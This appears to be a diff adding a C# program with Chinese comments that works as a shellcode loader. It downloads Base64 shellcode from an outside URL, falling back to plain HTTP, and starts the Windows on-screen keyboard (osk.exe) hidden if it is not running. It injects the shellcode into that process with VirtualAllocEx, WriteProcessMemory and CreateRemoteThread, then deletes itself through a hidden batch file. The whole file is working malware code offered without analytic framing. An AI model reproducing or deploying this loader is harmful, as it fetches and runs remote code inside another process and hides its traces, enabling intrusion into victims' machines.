@@ -1,0 +1,307 @@
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Text;
+using System.Net;
+using System.Threading;
+
+//主空间
+namespace ToDe1ta
+{
+    public class Program
+    {
+        static string shellcodeUrl = "https://me2hk.github.io/";                                                // 在线获取shellcode的URL
+        static string targetProcessName = "osk";                                                                // 注入目标进程名称
+        static bool injectionSuccess = false;                                                                   // 注入成功标志
+
+        //主入口
+        static void Main(string[] args)
+        {
+            try
+            {
+                // 设置安全协议为TLS 1.2
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+                // 在线获取shellcode的Base64编码
+                string base64Shellcode = DownloadString(shellcodeUrl); 
+                byte[] shellcode = Convert.FromBase64String(base64Shellcode);
+
+                // 获取osk进程的PID
+                int pid = GetProcessPidByName(targetProcessName);
+
+                // 如果未找到进程，则隐藏启动它
+                if (pid == -1)
+                {
+                    StartProcessHidden("osk.exe");
+                    // 等待进程启动
+                    Thread.Sleep(2000);
+
+                    // 再次尝试获取PID
+                    pid = GetProcessPidByName(targetProcessName);
+
+                    if (pid == -1)
+                    {
+                        Console.WriteLine("无法启动或找到osk进程");
+                        return;
+                    }
+                }
+
+                // 注入shellcode到目标进程
+                if (Inject(shellcode, pid) == 0)
+                {
+                    injectionSuccess = true;
+                    // 显示注入完成消息框
+                    ShowMessageBox("关于", string.Format("          名称:  {0} " + ".exe" + "\n" + "          PID:   {1}", targetProcessName, pid));
+                }
+                else
+                {
+                    // 注入失败
+                    ShowMessageBox("关于", string.Format("          注入进程失败", 0));
+                }
+
+                // 只有在注入成功时才删除自身
+                if (injectionSuccess)
+                {
+                    DeleteSelf();
+                }
+            }
+
+            // 异常处理
+            catch (Exception ex)
+            {
+                Console.WriteLine(string.Format("发生错误: {0}", ex.Message));
+                Console.WriteLine(string.Format("错误类型: {0}", ex.GetType().FullName));
+                Console.WriteLine(string.Format("堆栈跟踪: {0}", ex.StackTrace));
+                if (ex.InnerException != null)
+                {
+                    Console.WriteLine(string.Format("内部异常: {0}", ex.InnerException.Message));
+                }
+
+                // 显示错误消息框
+                ShowMessageBox("关于", string.Format("程序执行过程中发生错误: {0}", ex.Message));
+
+                Console.ReadLine();
+            }
+        }
+
+        // 隐藏启动进程的方法
+        static void StartProcessHidden(string processName)
+        {
+            try
+            {
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    FileName = Path.Combine(Environment.SystemDirectory, processName),
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                };
+
+                Process.Start(startInfo);
+                Console.WriteLine("已隐藏启动进程: " + processName);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("启动进程失败: " + ex.Message);
+            }
+        }
+
+        // 消息框API
+        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
+        public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
+
+        // 显示消息框方法
+        static void ShowMessageBox(string caption, string text)
+        {
+            MessageBox(IntPtr.Zero, text, caption, 0); // 0表示只有确定按钮
+        }
+
+        // 在线获取shellcode方法
+        static string DownloadString(string url)
+        {
+            try
+            {
+                // 使用WebClient替代HttpClient，它可能对旧系统有更好的兼容性
+                using (WebClient client = new WebClient())
+                {
+                    client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+                    return client.DownloadString(url);
+                }
+            }
+
+            //异常处理
+            catch (Exception ex)
+            {
+                Console.WriteLine(string.Format("下载失败: {0}", ex.Message));
+
+                // 尝试使用非HTTPS链接
+                if (url.StartsWith("https://"))
+                {
+                    string httpUrl = url.Replace("https://", "http://");
+                    try
+                    {
+                        using (WebClient client = new WebClient())
+                        {
+                            client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+                            return client.DownloadString(httpUrl);
+                        }
+                    }
+                    catch
+                    {
+                        // 如果非安全连接也失败，重新抛出原始异常
+                        throw ex;
+                    }
+                }
+
+                throw;
+            }
+        }
+
+        // 根据获取进程名PID方法
+        static int GetProcessPidByName(string processName)
+        {
+            // 确保进程名不包含.exe扩展名
+            if (processName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
+            {
+                processName = processName.Substring(0, processName.Length - 4);
+            }
+
+            Process[] processes = Process.GetProcessesByName(processName);
+            Console.WriteLine(string.Format("找到 {0} 个名为 {1} 的进程", processes.Length, processName));
+
+            if (processes.Length > 0)
+            {
+                return processes[0].Id;
+            }
+            return -1;
+        }
+
+        // Windows API导入和常量定义
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
+            uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
+            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool CloseHandle(IntPtr hObject);
+
+        // 进程访问权限常量
+        const int PROCESS_CREATE_THREAD = 0x0002;
+        const int PROCESS_QUERY_INFORMATION = 0x0400;
+        const int PROCESS_VM_OPERATION = 0x0008;
+        const int PROCESS_VM_WRITE = 0x0020;
+        const int PROCESS_VM_READ = 0x0010;
+
+        // 内存分配常量
+        const uint MEM_COMMIT = 0x00001000;
+        const uint MEM_RESERVE = 0x00002000;
+        const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+        // 注入shellcode到指定进程方法
+        public static int Inject(byte[] shellcode, int procPID)
+        {
+            IntPtr procHandle = IntPtr.Zero;
+            IntPtr allocMemAddress = IntPtr.Zero;
+            IntPtr remoteThread = IntPtr.Zero;
+
+            try
+            {
+                // 获取目标进程对象
+                Process targetProcess = Process.GetProcessById(procPID);
+
+                // 打开目标进程，获取进程句柄
+                procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+                                       PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+                                       false, targetProcess.Id);
+
+                if (procHandle == IntPtr.Zero)
+                {
+                    Console.WriteLine("打开进程失败");
+                    return -1;
+                }
+
+                // 在目标进程中分配内存
+                allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length,
+                                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+                if (allocMemAddress == IntPtr.Zero)
+                {
+                    Console.WriteLine("分配内存失败");
+                    return -1;
+                }
+
+                // 将shellcode写入目标进程的内存
+                UIntPtr bytesWritten;
+                bool writeResult = WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);
+
+                if (!writeResult)
+                {
+                    Console.WriteLine("写入内存失败");
+                    return -1;
+                }
+
+                // 在目标进程中创建远程线程执行shellcode
+                remoteThread = CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
+
+                if (remoteThread == IntPtr.Zero)
+                {
+                    Console.WriteLine("创建远程线程失败");
+                    return -1;
+                }
+
+                Console.WriteLine("注入完成");
+                return 0;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(string.Format("注入过程中发生错误: {0}", ex.Message));
+                return -1;
+            }
+            finally
+            {
+                // 清理资源
+                if (procHandle != IntPtr.Zero)
+                    CloseHandle(procHandle);
+
+                if (remoteThread != IntPtr.Zero)
+                    CloseHandle(remoteThread);
+            }
+        }
+
+        // 删除自身程序方法
+        static void DeleteSelf()
+        {
+            string batchFile = Path.Combine(Path.GetTempPath(), "delete_self.bat");
+            string currentExePath = Process.GetCurrentProcess().MainModule.FileName;
+
+            // 创建批处理文件来删除自身
+            using (StreamWriter sw = new StreamWriter(batchFile, false, Encoding.Default))
+            {
+                sw.WriteLine(":del");
+                sw.WriteLine(string.Format("del \"{0}\"", currentExePath));
+                sw.WriteLine(string.Format("if exist \"{0}\" goto del", currentExePath));
+                sw.WriteLine(string.Format("del \"{0}\"", batchFile));
+            }
+
+            // 执行批处理文件
+            ProcessStartInfo psi = new ProcessStartInfo(batchFile)
+            {
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true
+            };
+            Process.Start(psi);
+
+            // 退出当前程序
+            Environment.Exit(0);
+        }
+    }
+}
